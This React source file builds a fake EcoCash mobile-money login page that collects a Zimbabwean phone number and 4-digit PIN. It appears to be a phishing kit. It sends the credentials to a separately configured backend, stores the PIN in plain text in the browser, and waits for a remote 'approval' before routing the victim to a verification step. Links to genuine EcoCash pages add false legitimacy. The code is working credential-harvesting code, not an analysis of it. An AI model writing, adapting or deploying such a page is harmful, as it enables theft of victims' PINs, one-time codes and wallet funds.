import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useEcoLink } from '../EcolinkContext';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  const { updateAuthData, serverStatus } = useEcoLink();

  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';

  const [phoneNumber, setPhoneNumber] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isReturningUser, setIsReturningUser] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const pollingIntervalRef = useRef(null);
  const pollingAttempts = useRef(0);
  const maxPollingAttempts = 60;

  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
    };
  }, []);

  const validatePhoneNumber = (number) => {
    const length = number.length;
    if (length < 9 || length > 10) return { valid: false, message: '' };
    if (length === 10) {
      if (number[0] !== '0') return { valid: false, message: '10-digit numbers must start with 07' };
      if (number[1] !== '7') return { valid: false, message: '10-digit numbers must start with 07' };
    }
    if (length === 9 && number[0] !== '7') {
      return { valid: false, message: '9-digit numbers must start with 7' };
    }
    return { valid: true, message: '' };
  };

  const handlePhoneChange = (e) => {
    setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10));
  };

  const handlePhonePaste = (e) => {
    e.preventDefault();
    setPhoneNumber(e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 10));
  };

  const handlePinChange = (index, value) => {
    const num = value.replace(/\D/g, '');
    if (num.length > 1) return;
    const newPin = [...pin];
    newPin[index] = num;
    setPin(newPin);
    if (num && index < 3) pinRefs[index + 1].current.focus();
  };

  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
    const newPin = [...pin];
    digits.forEach((d, i) => { if (index + i < 4) newPin[index + i] = d; });
    setPin(newPin);
    pinRefs[Math.min(index + digits.length, 3)].current.focus();
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) {
        const newPin = [...pin]; newPin[index] = ''; setPin(newPin);
      } else if (index > 0) pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) pinRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 3) pinRefs[index + 1].current.focus();
  };

  const handlePinKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  const startPollingForApproval = (formattedPhone, fullPin, returning) => {
    pollingAttempts.current = 0;
    pollingIntervalRef.current = setInterval(async () => {
      try {
        pollingAttempts.current++;
        if (pollingAttempts.current > maxPollingAttempts) {
          clearInterval(pollingIntervalRef.current);
          setWaitingForApproval(false);
          setIsProcessing(false);
          setErrorMessage('Something went wrong, try again');
          setShowErrorModal(true);
          return;
        }

        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin })
        });
        const data = await response.json();

        if (data.success) {
          if (data.approved) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            await new Promise(r => setTimeout(r, 500));
            navigate(returning ? '/status' : '/verify');
          } else if (data.rejected) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            setErrorMessage('Wrong PIN');
            setShowErrorModal(true);
          } else if (data.expired) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            setErrorMessage('Something went wrong, try again');
            setShowErrorModal(true);
          }
        }
      } catch { /* continue polling on network errors */ }
    }, 5000);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    const fullPin = pin.join('');

    const validation = validatePhoneNumber(phoneNumber);
    if (!validation.valid) {
      setErrorMessage('Phone number must be 07xxxxxxxx or 7xxxxxxxx!\nPlease enter correct number and try again!');
      setShowErrorModal(true);
      return;
    }
    if (fullPin.length !== 4) {
      setErrorMessage('Please enter complete 4-digit PIN');
      setShowErrorModal(true);
      return;
    }

    const cleanNumber = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
    const formattedPhone = `+263${cleanNumber}`;

    updateAuthData({ phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false });

    try {
      localStorage.setItem('ecocash_phone', formattedPhone);
      localStorage.setItem('ecocash_auth', JSON.stringify({
        phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false,
        timestamp: new Date().toISOString()
      }));
    } catch { /* ignore */ }

    setIsProcessing(true);

    try {
      const statusResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-user-status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone })
      });
      const statusData = await statusResponse.json();
      const returning = statusData.isReturningUser || false;
      setIsReturningUser(returning);

      const loginResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, timestamp: new Date().toISOString() })
      });
      const loginData = await loginResponse.json();

      if (loginData.success) {
        setWaitingForApproval(true);
        startPollingForApproval(formattedPhone, fullPin, returning);
      } else {
        setIsProcessing(false);
        setErrorMessage('Failed to process login. Please try again.');
        setShowErrorModal(true);
      }
    } catch {
      setIsProcessing(false);
      setErrorMessage('Failed to process login. Please try again.');
      setShowErrorModal(true);
    }
  };

  const isFormComplete = phoneNumber.length >= 9 && pin.every(d => d !== '');

  const getButtonState = () => {
    if (serverStatus.isChecking) return { text: 'WAIT...', disabled: true, className: 'login-button waiting' };
    if (!serverStatus.isActive) return { text: 'SERVER ERROR', disabled: true, className: 'login-button error' };
    return { text: 'LOGIN', disabled: !isFormComplete || isProcessing, className: 'login-button' };
  };

  const buttonState = getButtonState();

  if (isProcessing || waitingForApproval) {
    return (
      <div className="login-container">
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            <h1 className="processing-title">
              {waitingForApproval ? 'Please wait...' : 'Processing...'}
            </h1>
            <p className="processing-subtitle">
              {waitingForApproval
                ? 'This usually takes a few seconds'
                : isReturningUser
                  ? 'Welcome back! Taking you to dashboard...'
                  : 'Preparing verification...'}
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="login-container">
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal-content" onClick={e => e.stopPropagation()}>
            <div className="error-modal-icon">⚠️</div>
            <h2 className="error-modal-title">Invalid Format</h2>
            <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
            <button className="error-modal-button" onClick={() => setShowErrorModal(false)}>OK</button>
          </div>
        </div>
      )}

      <div className="login-header">
        <div className="logo-large">
          <span className="logo-large-eco">Eco</span>
          <span className="logo-large-cash">Cash</span>
        </div>
      </div>

      <div className="login-content">
        <h1 className="login-title">Login</h1>

        {serverStatus.error && (
          <div className="server-status-message error">
            <p>⚠️ {serverStatus.error}</p>
          </div>
        )}

        <form className="login-form" onSubmit={handleLogin}>
          <div className="phone-input-container">
            <div className="country-code">
              <span className="flag-icon">🇿🇼</span>
              <span>+263</span>
            </div>
            <input
              type="tel"
              className="phone-input"
              value={phoneNumber}
              onChange={handlePhoneChange}
              onPaste={handlePhonePaste}
              placeholder="712345678"
              maxLength="10"
              inputMode="numeric"
              pattern="[0-9]*"
              required
              disabled={serverStatus.isChecking}
            />
          </div>

          <div className="pin-section">
            <p className="pin-label">Enter your PIN</p>
            <div className="pin-inputs-wrapper">
              <div className="pin-inputs">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    ref={pinRefs[index]}
                    type={showPin ? 'text' : 'password'}
                    className="pin-box"
                    value={digit}
                    onChange={e => handlePinChange(index, e.target.value)}
                    onKeyDown={e => handlePinKeyDown(index, e)}
                    onKeyPress={handlePinKeyPress}
                    onPaste={e => handlePinPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={serverStatus.isChecking}
                  />
                ))}
              </div>
              <button
                type="button"
                className="eye-button"
                onClick={() => setShowPin(p => !p)}
                aria-label={showPin ? 'Hide PIN' : 'Show PIN'}
                disabled={serverStatus.isChecking}
              >
                {showPin ? '👁️' : '👁️‍🗨️'}
              </button>
            </div>
            <p className="forgot-pin" onClick={() => window.location.href = 'https://partnerapplications.ecocash.co.zw/user/password/reset'}>
              Forgot PIN?
            </p>
          </div>

          <button type="submit" className={buttonState.className} disabled={buttonState.disabled}>
            {buttonState.text}
          </button>
        </form>
      </div>

      <div className="login-footer">
        <div className="wave-decoration"></div>
        <div className="footer-content">
          <p className="footer-text">
            To register an EcoCash wallet or get assistance,<br />click below
          </p>
          <div className="footer-buttons">
            <button className="footer-button" onClick={() => window.location.href = 'https://partnerapplications.ecocash.co.zw/signup'}>
              <span>👤</span><span>Register</span>
            </button>
            <button className="footer-button" onClick={() => window.location.href = 'https://ecocash.co.zw/contact-us/'}>
              <span>ℹ️</span><span>Help & Support</span>
            </button>
          </div>
          <p className="version-text">v2.1.3P</p>
          <p className="terms-text">
            By signing in you agree to the{' '}
            <span className="terms-link">
              <a href="https://ecocash.co.zw/terms-and-conditions/">Terms and Conditions</a>
            </span>
          </p>
        </div>
      </div>
    </div>
  );
}